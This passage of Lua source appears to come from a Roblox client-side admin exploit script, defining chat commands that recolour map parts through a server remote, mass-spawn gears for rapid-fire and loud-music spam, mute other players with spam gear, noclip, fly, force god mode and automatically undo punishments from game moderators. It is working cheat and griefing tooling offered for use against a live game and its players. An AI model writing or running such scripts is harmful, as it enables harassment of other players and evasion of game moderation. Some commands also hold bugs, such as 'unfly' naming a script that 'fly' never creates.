								["Color"] = transformToColor3(BrickColor.new("Sand red"))
							}
						remote:InvokeServer(v1, v13)
					end
				end)
			end
		end


		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Building Bricks"]:GetDescendants()) do
			if v:IsA("Part") then
				spawn(function()
					if v.Name == "Part29" or v.Name == "Part31" or v.Name == "Part55" then
						local v14 =
						{
							["Part"] = v,
							["Color"] = transformToColor3(BrickColor.new("Dark stone grey"))
						}
						remote:InvokeServer(v1, v14)
					end
				
					if v.Name == "Part11" or v.Name == "Part18" or v.Name == "Part25" or v.Name == "Part3" or v.Name == "Part43" then
						local v15 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Deep blue"))
							}
						remote:InvokeServer(v1, v15)
					end
				
					if v.Name == "Part13" or v.Name == "Part21" or v.Name == "Part23" or v.Name == "Part7" then
						local v16 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Institutional white"))
							}
						remote:InvokeServer(v1, v16)
					end
					
					if v.Name == "Part17" or v.Name == "Part26" or v.Name == "Part38" or v.Name == "Part5" or v.Name == "Part9" then
						local v17 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Lime green"))
							}
						remote:InvokeServer(v1, v17)
					end
					
					if v.Name == "Part30" or v.Name == "Part32" or v.Name == "Part33" or v.Name == "Part34" or v.Name == "Part35" or v.Name == "Part36" or v.Name == "Part39" or v.Name == "Part40" or v.Name == "Part41" or v.Name == "Part42" or v.Name == "Part46" or v.Name == "Part47" or v.Name == "Part48" or v.Name == "Part49" or v.Name == "Part50" or v.Name == "Part51" or v.Name == "Part52" or v.Name == "Part53" or v.Name == "Part54" or v.Name == "Part56" or v.Name == "Part57" or v.Name == "Part58" or v.Name == "Part59" or v.Name == "Part60" or v.Name == "Part61" or v.Name == "Part38" or v.Name == "Part5" or v.Name == "Part9" then
						local v18 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Medium Stone grey"))
							}
						remote:InvokeServer(v1, v18)
					end
					
					if v.Name == "Part12" or v.Name == "Part15" or v.Name == "Part24" or v.Name == "Part44" or v.Name == "Part6" then
						local v19 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("New yeller"))
							}
						remote:InvokeServer(v1, v19)
					end
					
					if v.Name == "Part14" or v.Name == "Part19" or v.Name == "Part2" or v.Name == "Part27" then
						local v20 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Really black"))
							}
						remote:InvokeServer(v1, v20)
					end
					
					if v.Name == "Part1" or v.Name == "Part10" or v.Name == "Part16" or v.Name == "Part22" or v.Name == "Part37" then
						local v21 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Really red"))
							}
						remote:InvokeServer(v1, v21)
					end
					
					if v.Name == "Part20" or v.Name == "Part28" or v.Name == "Part4" or v.Name == "Part45" or v.Name == "Part8" then
						local v22 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Toothpaste"))
							}
						remote:InvokeServer(v1, v22)
					end
				end)
			end
		end


		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
			spawn(function()
				if v:IsA("Part") then
					local v23 =
						{
							["Part"] = v,
							["Color"] = transformToColor3(BrickColor.new("Really red"))
						}
					remote:InvokeServer(v1, v23)
				end
				
				for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby Box"]:GetChildren()) do
					if v:IsA("Part") then
						local v24 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Teal"))
							}
						remote:InvokeServer(v1, v24)
					end
				end
			end)
		end
end)
wait(1.5)
			if ObbyDestroyed then runCommand(prefix.."localremoveobby",{}) end
end)

addCommand("rapidfiregun",{"bullets"},function(args)
Connections.rapidfiregun = game:GetService("UserInputService").InputBegan:Connect(function(inputa,gp)
if gp then return end
if inputa.UserInputType == Enum.UserInputType.MouseButton1 then
for i=1,tonumber(args[1]) do
    game.Players:Chat("gear me 139578207")
    wait()
end
wait(0.2)
for i,v in pairs(lp.Backpack:GetChildren()) do
    v.Parent = chr
    wait()
    local A_1 = plr:GetMouse().Hit.p
    v.Click:FireServer(A_1)
end
for i=1,tonumber(args[1]) do
    wait(0.1)
end
game.Players:Chat("removetools me")
end
end)
end)

addCommand("unrapidfiregun",{},function()
    Connections.rapidfiregun:Disconnect()
end)

addCommand("loudboombox",{"amount","id","range"},function(args)
    for i=1,tonumber(args[1]) do
    game.Players:Chat("gear me 212641536")
    wait()
end
wait(0.1)
for i,v in pairs(plr.Backpack:GetChildren()) do v.GripPos = Vector3.new(math.random(tonumber(args[3])*-2,args[3]),math.random(tonumber(args[3])*-2,args[3]),math.random(tonumber(args[3])*-2,args[3])) v.Parent=chr end
wait()
for i,v  in pairs(chr:GetChildren()) do
    if v:IsA("Tool") then
        pcall(function()
            v.Remote:FireServer("PlaySong",args[2])
        end)
    end
end
end)

addCommand("boombox",{},function()
    game.Players:Chat("gear me 212641536")
end)

addCommand("muteplayer",{"player"},function(args)
   
    for i,v in pairs(GetPlayers(args[1])) do
        game.Players:Chat(".spam gear "..v.Name.." 253519495")
    end
end)

addCommand("unmute",{},function()
game.Players:Chat(".unspam")
end)

addCommand("cloneai",{"amount"},function(args)
    game.Players:Chat("pm me ["..ScriptName.."]\nCredits to atprog for the command idea.")
    for i=1,tonumber(args[1]) do
        game.Players:Chat("gear me 72644644")
        wait()
    end
    wait(0.25)
    for i,v  in pairs(plr.Backpack:GetChildren()) do
        local staff = v
        v.Parent = chr
    end
    wait(0.1)
    for i,v  in pairs(chr:GetChildren()) do
        if v:IsA("Tool") then
            v:Activate()
        end
    end
end)

addCommand("mozart",{"amount"},function(args)
    for i=1,tonumber(args[1]) do
        game.Players:Chat("gear me 113299590")
        wait()
    end
    wait(0.25)
    for i,v  in pairs(plr.Backpack:GetChildren()) do
        local staff = v
        v.Parent = chr
    end
    wait(0.1)
    for i,v  in pairs(chr:GetChildren()) do
        if v:IsA("Tool") then
            v:Activate()
        end
    end
end)

addCommand("bassdrop",{"amount"},function(args)
    for i=1,tonumber(args[1]) do
    game.Players:Chat("gear me 152233094")
    wait()
end
wait(0.25)
   for i,v  in pairs(plr.Backpack:GetChildren()) do
    local staff = v
    v.Parent = chr
end
wait(0.1)
for i,v  in pairs(chr:GetChildren()) do
    if v:IsA("Tool") then
        game:GetService("RunService").RenderStepped:Connect(function()if v.Parent==chr then  v:Activate()end end)
    end
end
end)

addCommand("droprock",{"player"},function(args)
	for i,v in pairs(GetPlayers(args[1])) do
		if v and v.Character and v.Character:FindFirstChild("Head") then
			dropRock(v.Character.Head.Position)
		end
	end
end)

addCommand("coolstoryman",{"amount"},function(args)
    for i=1,tonumber(args[1]) do
    game.Players:Chat("gear me 119101643")
    wait()
end
wait(0.25)
   for i,v  in pairs(plr.Backpack:GetChildren()) do
    local staff = v
    v.Parent = chr
end
wait(0.1)
for i,v  in pairs(chr:GetChildren()) do
    if v:IsA("Tool") then
        game:GetService("RunService").RenderStepped:Connect(function()if v.Parent==chr then  v:Activate()end end)
    end
end
end)

addCommand("antiabuse",{},function()
    Loops.antiabuse = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
        if chr and chr.Parent == game.Lighting then
            game.Players:Chat("unpunish me")
		chr.Parent=workspace
        end
        if lp.PlayerGui:FindFirstChild("EFFECTGUIBLIND") then
            lp.PlayerGui:FindFirstChild("EFFECTGUIBLIND"):Destroy()
            game.Players:Chat("unblind me")
        end
        if chr and chr.Humanoid and chr.Humanoid.Health <=0 then
            game.Players:Chat("reset me")
        end
	if chr and chr:FindFirstChild("Rocket") then
		for i,v in pairs(chr:GetChildren()) do if v.Name=="Rocket" then v:Destroy() end end
		if PersonsAdmin then game.Players:Chat("unrocket/me") else game.Players:Chat("reset me") end
	end
        if chr and chr:FindFirstChild("ice") then
            game.Players:Chat("unfreeze me")
            chr:FindFirstChild("ice"):Destroy()
            for i,v in pairs(chr:GetDescendants()) do
                if v:IsA("BasePart") then v.Anchored = false end
            end
        end
        if chr and chr:FindFirstChild("Addon") then
            chr:FindFirstChild("Addon"):Destroy()
            game.Players:Chat("reset me")
        end
        if chr and chr.Head and chr.Torso and game.Players.LocalPlayer:DistanceFromCharacter(game.Players.LocalPlayer.Character.Torso.Position) == 0 then
            game.Players:Chat("reset me")
        end
        if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(plr.Name.."'s jail") then
            game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(plr.Name.."'s jail"):Destroy()
            game.Players:Chat("unjail me")
        end
        if chr and chr.Torso and chr.Torso:FindFirstChild("SPINNER") then
            chr.Torso:FindFirstChild("SPINNER"):Destroy()
            game.Players:Chat("unspin me")
        end
        if plr.PlayerGui:FindFirstChild("NoClip") then
            plr.PlayerGui:FindFirstChild("NoClip"):Destroy()
            if chr and chr.Torso then chr.Torso.Anchored = false end
            if chr and chr.Humanoid then chr.Humanoid.PlatformStand = false end
            game.Players:Chat("clip me")
        end
       
            local player = game.Players.LocalPlayer
             if player.Character then
                    local humanoid = player.Character:WaitForChild("Humanoid", 1)
                    if humanoid and humanoid.PlatformStand then
                        humanoid.PlatformStand = false
                        Chat("unstun me")
                    end
            
                if game.Players.LocalPlayer.Character:FindFirstChild("Seizure") then
                Chat("unseizure me")
            end
     
           if game.Players.LocalPlayer.UserId ~= game.Players.LocalPlayer.CharacterAppearanceId then
              Chat("unchar me")
           end
        end
        
                for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                        if v.Name == "MessageGUI" or v.Name == "Message" or v.Name == "HintGUI" or v.Name == "Ice" then
                                    v:Destroy()
                        end
                end
        
    end)until not Loops.antiabuse
end)

addCommand("antispeed",{},function()
	local function onChar(Char)
		repeat wait() until Char:FindFirstChildOfClass("Humanoid")
			Connections.antispeedb = Char.Humanoid.Changed:Connect(function(prop)
				if prop == "WalkSpeed" then
					game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
				end
		end)
	end
	
	Connections.antispeeda = game.Players.LocalPlayer.CharacterAdded:Connect(onChar)
	onChar(game.Players.LocalPlayer.Character)
end)

addCommand("unantispeed",{},function()
	Connections.antispeeda:Disconnect()
	Connections.antispeedb:Disconnect()
end)

addCommand("antimsg",{},function()
	Loops.antimessage = true
	repeat game:GetService("RunService").RenderStepped:Wait()
		pcall(function()
			if game.Players.LocalPlayer.PlayerGui:FindFirstChild("HintGui") then
				game.Players.LocalPlayer.PlayerGui:FindFirstChild("HintGui"):Destroy()
				game.Players:Chat("clr")
			end
			if game.Players.LocalPlayer.PlayerGui:FindFirstChild("MessageGui") then
				game.Players.LocalPlayer.PlayerGui:FindFirstChild("MessageGui"):Destroy()
				game.Players:Chat("clr")
			end
			
			if game.Terrain["_Game"].Folder:FindFirstChildOfClass("Message") then
				if not string.find(game.Terrain["_Game"].Folder:FindFirstChildOfClass("Message").Text,ScriptName) then
					game.Terrain["_Game"].Folder:FindFirstChildOfClass("Message"):Destroy()
					game.Terrain["_Game"].Folder:FindFirstChildOfClass("Message")
				end
			end
			if game.Terrain["_Game"].Folder:FindFirstChildOfClass("Hint") then
				if not string.find(game.Terrain["_Game"].Folder:FindFirstChildOfClass("Hint").Text,ScriptName) then
					game.Terrain["_Game"].Folder:FindFirstChildOfClass("Hint"):Destroy()
					game.Terrain["_Game"].Folder:FindFirstChildOfClass("Hint")
				end
			end
		end)
	until not Loops.antimessage
end)

addCommand("unantimsg",{},function()
	Loops.antimessage = false
end)

addCommand("antiepilepsy",{},function()
    Loops.antiepilepsy = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
        if workspace.Terrain["_Game"] and workspace.Terrain["_Game"].Folder and workspace.Terrain["_Game"].Folder:FindFirstChild("Flash") then
		workspace.Terrain["_Game"].Folder:FindFirstChild("Flash"):Destroy()
		game.Players:Chat("fix")
	end
    end)until not Loops.antiepilepsy
end)

addCommand("unantiepilepsy",{},function()
    Loops.antiepilepsy = false
end)

addCommand("antilighting",{},function()
    Loops.antilighting = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
        if game.Lighting.Ambient ~= Color3.new(0,0,0) or game.Lighting.OutdoorAmbient ~= Color3.fromRGB(128,128,128) or game.Lighting.Brightness ~= 1 or game.Lighting.ColorShift_Bottom ~= Color3.new(0,0,0) or game.Lighting.ColorShift_Top ~= Color3.new(0,0,0) or game.Lighting.EnvironmentDiffuseScale ~= 0 or game.Lighting.EnvironmentSpecularScale ~= 0 or game.Lighting.ShadowSoftness ~= 0.5 or game.Lighting.ClockTime ~= 14 or game.Lighting.GeographicLatitude ~= 41.733299255371094 or game.Lighting.FogStart ~= 0 or game.Lighting.FogEnd ~= 100000 or (math.floor(game.Lighting.FogColor.R*255)~=192 or math.floor(game.Lighting.FogColor.G*255)~=192 or math.floor(game.Lighting.FogColor.B*255)~=192) then
		game.Players:Chat("fix")
		game.Lighting.Ambient = Color3.new(0,0,0)
		game.Lighting.Brightness = 1
		game.Lighting.ColorShift_Bottom = Color3.new(0,0,0)
		game.Lighting.ColorShift_Top = Color3.new(0,0,0)
		game.Lighting.EnvironmentDiffuseScale = 0
		game.Lighting.EnvironmentSpecularScale = 0
		game.Lighting.OutdoorAmbient = Color3.fromRGB(128,128,128)
		game.Lighting.ShadowSoftness = 0.5
		game.Lighting.ClockTime = 14
		game.Lighting.GeographicLatitude = 41.733299255371094
		game.Lighting.FogStart = 0
		game.Lighting.FogEnd = 100000
		game.Lighting.FogColor = Color3.new(192/255,192/255,192/255)
	end
    end)until not Loops.antilighting
end)

addCommand("unantilighting",{},function()
    Loops.antilighting = false
end)

addCommand("crashdetector",{},function()
	Loops.crashdetector = true
	repeat wait(10) spawn(function()
		runCommand(prefix.."if",{"iscrashed","then","prompttoserverhop"})
	end) until not Loops.crashdetector
end)

addCommand("uncrashdetector",{},function()
	Loops.crashdetector = false
end)

addCommand("antifly",{},function()
    Loops.antifly = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
        if plr.PlayerGui:FindFirstChild("Fly") then
            plr.PlayerGui:FindFirstChild("Fly"):Destroy()
            if chr and chr.Torso then chr.Torso.Anchored = false end
            if chr and chr.Humanoid then chr.Humanoid.PlatformStand = false end
            game.Players:Chat("unfly me")
        end
    end)
    until not Loops.antifly
end)

addCommand("unantifly",{},function()
    Loops.antifly = false
end)

addCommand("antikick",{},function()
    Loops.antikick = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
    if chr and chr:FindFirstChild("BlueBucket") then
        chr:FindFirstChild("BlueBucket"):Destroy()
        game.Players:Chat("removetools me")
    end
    if plr and plr.Backpack and plr.Backpack:FindFirstChild("BlueBucket") then
        plr.Backpack:FindFirstChild("BlueBucket"):Destroy()
        game.Players:Chat("removetools me")
    end
    if chr and chr:FindFirstChild("HotPotato") then
        chr:FindFirstChild("HotPotato"):Destroy()
        game.Players:Chat("removetools me")
    end
    if plr and plr.Backpack and plr.Backpack:FindFirstChild("HotPotato") then
        plr.Backpack:FindFirstChild("HotPotato"):Destroy()
        game.Players:Chat("removetools me")
    end
    if chr and chr:FindFirstChild("DriveBloxUltimateCar") then
        chr:FindFirstChild("DriveBloxUltimateCar"):Destroy()
        game.Players:Chat("removetools me")
    end
    if plr and plr.Backpack and plr.Backpack:FindFirstChild("DriveBloxUltimateCar") then
        plr.Backpack:FindFirstChild("DriveBloxUltimateCar"):Destroy()
        game.Players:Chat("removetools me")
    end
	for i,v in pairs(workspace:GetDescendants()) do
		if v and v.Name == "Rocket" then
			pcall(function()
				if v.CanCollide then
					v.CanCollide = false
				end
			end)
		end
	end
    end)until not Loops.antikick
end)

addCommand("anticrash",{},function()
    runCommand(prefix.."antikick",{})
end)

addCommand("unanticrash",{},function()
    runCommand(prefix.."unantikick",{})
end)

addCommand("unantikick",{},function()
    Loops.antikick = false
end)

addCommand("antiservercrash",{},function()
    Loops.antiservercrash = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
    for i,v in pairs(game.Players:GetPlayers()) do
        spawn(function()
            if v and v.Character and v.Character:FindFirstChild("VampireVanquisher") then v.Character:FindFirstChild("VampireVanquisher"):Destroy() game.Players:Chat("removetools "..v.Name)game.Players:Chat("reset "..v.Name)game.Players:Chat("kill "..v.Name)
                GUI:SendMessage(ScriptName, "Please don't crash the server, "..v.DisplayName..".")
                end
        end)
        spawn(function()
            if v.Backpack:FindFirstChild("VampireVanquisher") then v.Backpack:FindFirstChild("VampireVanquisher"):Destroy() game.Players:Chat("removetools "..v.Name)game.Players:Chat("reset "..v.Name)
                GUI:SendMessage(ScriptName, "Please don't crash the server, "..v.DisplayName..".")
                end
        end)
    end
    end)until not Loops.antiservercrash
end)

addCommand("unantiservercrash",{},function()
    Loops.antiservercrash = false
end)

addCommand("blacklisttools",{"toolnames"},function(args)
	local fixer = args[1]
	for i=2, #args do
    	    fixer = fixer.." "..args[i]	
    	end
	local BlacklistedTools = fixer:split(";")
    Loops.blacklisttools = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
    for i,v in pairs(game.Players:GetPlayers()) do
		for i,too in pairs(BlacklistedTools) do
        spawn(function()
            if v and v.Character and v.Character:FindFirstChild(too) then v.Character:FindFirstChild(too):Destroy() game.Players:Chat("removetools "..v.Name)game.Players:Chat("reset "..v.Name)game.Players:Chat("kill "..v.Name)
                GUI:SendMessage(ScriptName, "Please don't use "..too..", "..v.DisplayName..".")
                end
        end)
        spawn(function()
            if v.Backpack:FindFirstChild(too) then v.Backpack:FindFirstChild(too):Destroy() game.Players:Chat("removetools "..v.Name)game.Players:Chat("reset "..v.Name)
                GUI:SendMessage(ScriptName, "Please don't use "..too..", "..v.DisplayName..".")
                end
        end)
		end
    end
    end)until not Loops.blacklisttools
end)

addCommand("unbl",{},function()
	Loops.blacklisttools = false
end)

addCommand("unantiservercrash",{},function()
    Loops.antiservercrash = false
end)

addCommand("antitool",{},function()
    Loops.antitool = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
        if chr:FindFirstChildOfClass("Tool") then
            chr:FindFirstChildOfClass("Tool"):Destroy()
            game.Players:Chat("removetools me")
        end
        if plr.Backpack:FindFirstChildOfClass("Tool") then
            plr.Backpack:ClearAllChildren()
            game.Players:Chat("removetools me")
        end
    end) until not Loops.antitool
end)

addCommand("unantitool",{},function()
    Loops.antitool = false
end)

addCommand("unantiabuse",{},function()
    Loops.antiabuse = false
end)

addCommand("antivoid",{},function()
    Loops.antivoid = true
    repeat game:GetService("RunService").RenderStepped:Wait()pcall(function()
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.HumanoidRootPart then
            if game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y < -7 then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X,5,game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.X,0,game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Z)
            end
        end end)
    until not Loops.antivoid
end)

addCommand("unantivoid",{},function()
    Loops.antivoid = false
end)

addCommand("antiskydive",{},function()
    Loops.antiskydive = true
    repeat game:GetService("RunService").RenderStepped:Wait()pcall(function()
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.HumanoidRootPart then
            if game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y > 256 then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X,5,game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.X,0,game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Z)
            end
        end end)
    until not Loops.antiskydive
end)

addCommand("unantiskydive",{},function()
    Loops.antiskydive = false
end)

addCommand("antigrav",{},function()
    Loops.antigrav = true
    repeat game:GetService("RunService").RenderStepped:Wait()pcall(function()
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
            if game.Players.LocalPlayer.Character.Torso:FindFirstChildOfClass("BodyForce") then
			game.Players.LocalPlayer.Character.Torso:FindFirstChildOfClass("BodyForce"):Destroy()
		end
        end
end)
    until not Loops.antigrav
end)

addCommand("unantigrav",{},function()
    Loops.antigrav = false
end)

addCommand("platform",{},function()
    Loops.platform = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Head then
            if not workspace.Terrain:FindFirstChild("PLATFORM###14") then
                local fakepart=Instance.new("Part",workspace.Terrain)fakepart.Name="PLATFORM###14"fakepart.Size=Vector3.new(10,1,10)fakepart.Anchored = true;fakepart.CanCollide = true;fakepart.Color = game.Players.LocalPlayer.Character.Torso.Color;if CustomColor then fakepart.Color=CustomColor end;fakepart.TopSurface="Smooth"fakepart.BottomSurface="Smooth"fakepart.Material = "SmoothPlastic"
            else
                local fakepart=workspace.Terrain:FindFirstChild("PLATFORM###14")
                fakepart.Color=game.Players.LocalPlayer.Character.Torso.Color
		if CustomColor then fakepart.Color=CustomColor end
                fakepart.CFrame=CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X,0.199999332,game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z) * CFrame.Angles(0,math.rad(game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation.Y),0) 
            end
        end
    end)
    until not Loops.platform
end)

addCommand("removeplatform",{},function()
    Loops.platform = false
	if workspace.Terrain:FindFirstChild("PLATFORM###14") then
    		workspace.Terrain:Destroy()
	end
end)

addCommand("unplatform",{},function()
    runCommand(prefix.."removeplatform",{})
end)

addCommand("antiname",{},function()
    Loops.antiname = true
    repeat wait() 
        if chr and chr:FindFirstChildOfClass("Model") and #chr:FindFirstChildOfClass("Model"):GetChildren()==2 then
            game.Players:Chat("unname me")
		chr:FindFirstChildOfClass("Model"):Destroy()
        end
    until not Loops.antiname
end)

addCommand("unantiname",{},function()
    Loops.antiname = false
end)

addCommand("noclip",{},function()
    Loops.noclip = true
    repeat game:GetService("RunService").Stepped:Wait()
        pcall(function()
			for _, child in pairs(chr:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true then
					child.CanCollide = false
				end
			end
		end)
    until not Loops.noclip
end)

addCommand("clip",{},function()
    Loops.noclip=false
end)

addCommand("unnoclip",{},function()
    runCommand(prefix.."clip",{})
end)

addCommand("characteradded",{"player","command"},function(args)
	local s,f=pcall(function()
	for i,v in pairs(GetPlayers(args[1])) do
		local fixer = {}
		if #args>2 then
			for i=3,#args do
				table.insert(fixer,args[i])
			end
		end
		
		local function Charadd(Character)
			runCommand(prefix..args[2],fixer)
		end
		
		Connections["_CHARACTERADDED"..v.Name] = v.CharacterAdded:Connect(Charadd)
		Charadd(v.Character)
	end
	end)if not s then print(f) end
end)

addCommand("uncharacteradded",{"player"},function(args)
	for i,v in pairs(GetPlayers(args[1])) do
		Connections["_CHARACTERADDED"..v.Name]:Disconnect()
	end
end)

addCommand("autogod",{},function()
    Loops.autogod = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        pcall(function()
            if chr and chr:FindFirstChild("Humanoid") and tostring(chr.Humanoid.MaxHealth) ~= "inf" then
                game.Players:Chat("god me")
                game.Players.LocalPlayer.Character.Humanoid.MaxHealth = math.huge
                game.Players.LocalPlayer.Character.Humanoid.Health = 9e9
            end
        end)
    until not Loops.autogod
end)

addCommand("unautogod",{},function()
    Loops.autogod = false
end)

addCommand("fly",{},function()
    repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
local script = Instance.new("Script",game.Players.LocalPlayer.PlayerGui)
script.Name = "Fly##PRAdmin"
local mouse = game.Players.LocalPlayer:GetMouse() 
repeat wait() until mouse
local plr = game.Players.LocalPlayer 
local chr = plr.Character
local torso = plr.Character.Torso 
local flying = true
local deb = true 
local ctrl = {f = 0, b = 0, l = 0, r = 0} 
local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
local maxspeed = 50 
local speed = 0 
function Fly() 
local bg = Instance.new("BodyGyro", torso) 
bg.P = 9e4 
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
bg.cframe = torso.CFrame 
local bv = Instance.new("BodyVelocity", torso) 
bv.velocity = Vector3.new(0,0.1,0) 
bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
chr.Humanoid.PlatformStand = true 
repeat wait() 
if not plr.PlayerGui:FindFirstChild("Fly##PRAdmin") then flying = false bg:Destroy() bv:Destroy() chr.Humanoid.PlatformStand = false error("Stop") end
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
speed = speed+.5+(speed/maxspeed) 
if speed > maxspeed then 
speed = maxspeed 
end 
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
speed = speed-1 
if speed < 0 then 
speed = 0 
end 
end 
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
else 
bv.velocity = Vector3.new(0,0.1,0) 
end 
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
until not flying 
ctrl = {f = 0, b = 0, l = 0, r = 0} 
lastctrl = {f = 0, b = 0, l = 0, r = 0} 
speed = 0 
bg:Destroy() 
bv:Destroy() 
chr.Humanoid.PlatformStand = false 
end 
mouse.KeyDown:connect(function(key) 
if key:lower() == "e" then 
if flying then flying = false 
else 
flying = true 
Fly() 
end 
elseif key:lower() == "w" then 
ctrl.f = 1 
elseif key:lower() == "s" then 
ctrl.b = -1 
elseif key:lower() == "a" then 
ctrl.l = -1 
elseif key:lower() == "d" then 
ctrl.r = 1 
end 
end) 
mouse.KeyUp:connect(function(key) 
if key:lower() == "w" then 
ctrl.f = 0 
elseif key:lower() == "s" then 
ctrl.b = 0 
elseif key:lower() == "a" then 
ctrl.l = 0 
elseif key:lower() == "d" then 
ctrl.r = 0 
end 
end)
Fly()
end)

addCommand("unfly",{},function()
    game.Players.LocalPlayer.PlayerGui["Fly##iiAdmin"]:Destroy()
end)

addCommand("antitripmine",{},function()
    Loops.antitripmine = true
    repeat wait() 
        if workspace:FindFirstChild("SubspaceTripmine") then
            workspace:FindFirstChild("SubspaceTripmine"):Destroy()
            game.Players:Chat("clr")
        end
    until not Loops.antitripmine
end)

addCommand("unantitripmine",{},function()
    Loops.antitripmine = false
end)

addCommand("antieggbomb",{},function()
    Loops.antieggbomb = true
    repeat wait() 
        if workspace:FindFirstChild("EggBomb") then
            workspace:FindFirstChild("EggBomb"):Destroy()
            game.Players:Chat("clr")
        end
    until not Loops.antieggbomb
end)

addCommand("unantieggbomb",{},function()
    Loops.antieggbomb = false
end)

addCommand("spamcommands",{"delay","command"},function(args)
                Loops.spamcommand = true
                repeat
                    local message = args[2]
                for i=3, #args do
                        if args[i]=="<%RANDOMSTRING%>" then
                            local asuhdyuasd=""
                            for i=1,25 do
                            asuhdyuasd=asuhdyuasd..lettersTableFormat[math.random(#lettersTableFormat)]
                            end
                            
                            message = message.." "..asuhdyuasd
                        elseif args[i]==[[\n]] then
                        message = message.." ".."\n"
                        else
                        message = message.." "..args[i]
                        end
                end
                    for i,v in pairs(message:split("|")) do
                        game.Players:Chat(v)
                        wait(tonumber(args[1]))
                    end
until not Loops.spamcommand
end)

addCommand("bind",{"key","command"},function(args)
                Connections["_Binding"..tostring(math.random(0,99999))] =game:GetService("UserInputService").InputBegan:Connect(function(Key,GP)
                    if not GP and Key.KeyCode == Enum.KeyCode[args[1]] then
                    local message = args[2]
                for i=3, #args do
                        if args[i]=="<%RANDOMSTRING%>" then
                            local asuhdyuasd=""
                            for i=1,25 do
                            asuhdyuasd=asuhdyuasd..lettersTableFormat[math.random(#lettersTableFormat)]
                            end
                            
                            message = message.." "..asuhdyuasd
                        elseif args[i]==[[\n]] then
                        message = message.." ".."\n"
                        elseif args[i]=="<%MOUSETARGET%>" then
                            local MouseTarget = plr:GetMouse().Target
                            MouseTarget = MouseTarget.Parent
                            if MouseTarget:IsA("Accessory") or MouseTarget:IsA("Hat") then
                                MouseTarget = MouseTarget.Parent
                            end
